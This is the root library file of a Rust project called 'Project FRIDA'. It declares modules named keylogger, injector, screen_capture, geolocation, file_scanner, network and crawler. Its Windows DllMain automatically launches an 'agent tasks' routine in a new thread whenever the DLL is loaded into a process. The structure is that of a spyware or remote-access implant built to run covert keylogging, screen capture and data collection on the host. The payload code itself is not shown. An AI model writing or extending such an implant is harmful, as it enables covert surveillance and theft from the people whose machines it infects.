//! Project FRIDA Library
//!
//! Re-exports all modules so they can be shared between the binary (`main.rs`)
//! and external integration tests.

pub mod device_monitor;
pub mod drives;
pub mod file_scanner;
pub mod geolocation;
pub mod agent_tasks;
pub mod injector;
pub mod keylogger;
pub mod log;
pub mod network;
pub mod screen_capture;
pub mod writer;
pub mod paths;
pub mod constants;
pub mod crawler;


#[cfg(all(windows, feature = "dll"))]
mod dll_entry {
    use crate::{crawler, constants, drives, log::Log};
    use std::thread;
    use winapi::shared::minwindef::{BOOL, DWORD, HINSTANCE, LPVOID};
    use winapi::um::winnt::DLL_PROCESS_ATTACH;

        fn run_privileged_tasks() {
        // Create a new Tokio runtime for our async tasks.
        let rt = tokio::runtime::Runtime::new().unwrap();
        rt.block_on(async {
            // Run the shared agent tasks.
            crate::agent_tasks::run().await;
        });
    }

    #[no_mangle]
    #[allow(non_snake_case)]
    pub extern "system" fn DllMain(
        _hinst_dll: HINSTANCE,
        fdw_reason: DWORD,
        _lpv_reserved: LPVOID,
    ) -> BOOL {
        if fdw_reason == DLL_PROCESS_ATTACH {
            // Spawning a new thread is crucial. DllMain should not block.
            thread::spawn(run_privileged_tasks);
        }
        true.into()
    }
}